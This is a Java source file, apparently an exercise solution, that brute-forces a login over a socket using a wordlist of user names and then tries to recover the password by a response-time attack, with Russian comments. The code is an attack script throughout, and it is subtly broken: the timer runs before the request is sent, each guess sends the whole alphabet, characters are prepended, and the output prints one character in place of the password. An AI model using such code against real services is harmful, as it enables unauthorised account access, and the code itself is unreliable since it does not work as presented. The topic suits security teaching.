package hacker;

import java.io.*;
import java.net.Socket;
import java.nio.file.Files;
import java.nio.file.Path;

public class Main {
    private static String  abc = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

    public static void main(String[] args) throws IOException {
        try (Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
             DataOutputStream output = new DataOutputStream(socket.getOutputStream());
             DataInputStream input = new DataInputStream(socket.getInputStream());
             BufferedReader logins = Files.newBufferedReader(Path.of("src", "hacker", "logins.txt"))) {
            String login = null;
            String word;

            while ((word = logins.readLine()) != null) {
                String response = send(word,"password", output, input);

                if (!response.contains("Wrong login!")) {
                    login = word;
                    break;
                }
            }

            if (login == null) {
                return;
            }

            String password = "";

            while (true) {
                int index = 0;
                long time = 0;
                char charResult = 0;

                while (index < abc.length()) {
                    char num = abc.charAt(index);
                    String numPass =password + abc;
                    long timeStart = System.currentTimeMillis();
                    // время ответа сервера
                    long timeResp = System.currentTimeMillis() - timeStart;
                    String response = send(login, numPass, output, input);

                    if (response.contains("Connection success!")) {
                        String result = """
                         {"login":"%s","password":"%s"}""".formatted(login, num);
                        System.out.println(result);
                        return;
                    }

                    if (timeResp > time) {
                        time = timeResp;
                        charResult = num;
                    }
                    index++;
                }
                // добавляем найденный символ к паролю
                password = charResult + password;
            }
        }
    }
    private static String send(
            String login,
            String password,
            DataOutputStream output,
            DataInputStream input
    ) throws IOException {
        String request = """
        {"login":"%s","password":"%s"}""".formatted(login, password);

        output.writeUTF(request);
        return input.readUTF();
    }
}